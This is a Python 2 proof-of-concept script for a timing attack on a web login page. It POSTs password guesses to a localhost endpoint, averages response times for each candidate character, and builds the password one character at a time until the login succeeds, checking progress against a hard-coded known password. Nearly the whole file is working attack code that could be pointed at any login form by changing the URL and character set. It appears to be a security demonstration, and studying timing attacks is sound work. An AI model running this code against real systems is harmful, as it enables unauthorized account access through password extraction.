#!/usr/bin/env python
'''
    This script attempts to perform timing attacks on web applications. It will
    make a given number of requests to a web server with a specified character 
    set. It will then take the average of the amount of time it took for each 
    character to be processed, and add the most likely character to the 
    variable containing what is guessed to be the correct password.
'''

import time
import requests
import string
import sys

# for when running in proof of concept mode
# this will keep track of the number of failed times the program executes before
# it is able to get the correct password through a timing attack
KNOWNPASSWORD = 'abc'
FAILEDPOCS = 0

USERNAME = 'test'
URL = 'http://localhost:3000/login'
#CHARSET = string.ascii_lowercase
CHARSET = 'abcde'

# Message that comes in the response when the login fails
FAILLOGINMESSAGE = 'Invalid username/password combination'

# set to be the number of requests to set to the server for every character
NUMREQUESTS = 10

# POST parameter variable names
USERNAMEPOSTPARAM = 'username'
PASSWORDPOSTPARAM = 'password'

def makerequest(guess):
    '''
        Makes the request to the server with the username/password combo.
        Passes a dict containing the character and a value containing the 
        total amount of time it took for the server to respond to all of 
        the requests containing that character

        Return: the substring of the assumed value for the correct password 
        (based on the highest time value in the dict of characters)
    '''
    chartimes = {}
    chartimeavg = {}
    global FAILEDPOCS
    global KNOWNPASSWORD


    # for every character in the characterset, make a request
    for c in CHARSET:
        newguess = guess + c

        # initialize the time for the character to be 0
        chartimes[c] = 0.0

        print "Sending " + str(NUMREQUESTS) + " requests to the server for the password '" + newguess + "'"
        parameters = {USERNAMEPOSTPARAM: USERNAME, PASSWORDPOSTPARAM: newguess}
        for i in range(0,NUMREQUESTS):
            start = time.time()
            # make request
            r = requests.post(URL, data=parameters)
            end = time.time()

            # if the response doesn't contain the following string, you successfully logged in and now have the password
            if FAILLOGINMESSAGE not in r.text:
                print "SUCCESS: Number of failed timing attack attempts before success: " + str(FAILEDPOCS)
                print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                sys.exit()
            #print "response is: " + r.text
            chartimes[c] += end - start
            if i == NUMREQUESTS-1:
                print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."

    # get avg of chartimes
    chartimeavg = getaverage(chartimes)

    # create a counter for the following for loop
    n = 0

    # sort the characters based on the average time
    print "Average time per request for each password guess"
    for key, value in sorted(chartimeavg.iteritems(), key=lambda (k,v): (v,k)):
        print "%s: %s" % (key, value)
        if n == len(chartimeavg.keys())-1:
            newguess = guess + key
            print "Guessing password begins with: '" + newguess + "'"
            if newguess != KNOWNPASSWORD[:len(newguess)]:
                print "'" + newguess + "' != '" + KNOWNPASSWORD[:len(newguess)] + "'"
                FAILEDPOCS += 1
                print "Number of failed timing attack attempts: " + str(FAILEDPOCS) + "\n"
                main()
            return newguess
        n += 1



def getaverage(chartimes):
    '''
        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
        are character: total_time where total_time is the total amount of time 
        it took the server to respond to all of the requests for that character
        collectively.

        Return: the dict in a key:value pair where the value is the average 
        amount of time for all of the requests 
    '''
    chartimeavg = {}

    # get average time for each request for every character
    for char in chartimes:
        chartimeavg[char] = chartimes[char]/NUMREQUESTS

    return chartimeavg


def main():
    temppass = ''

    print "Attempting to log into " + URL + " as user '" + USERNAME + "'"
    print "Character set is: " + CHARSET
    print "Failed login message is: 'Invalid username/password combination'"
    print "----------------------------------------------------------------\n"

    while True:
        temppass = makerequest(temppass)

if __name__ == '__main__':
    main()
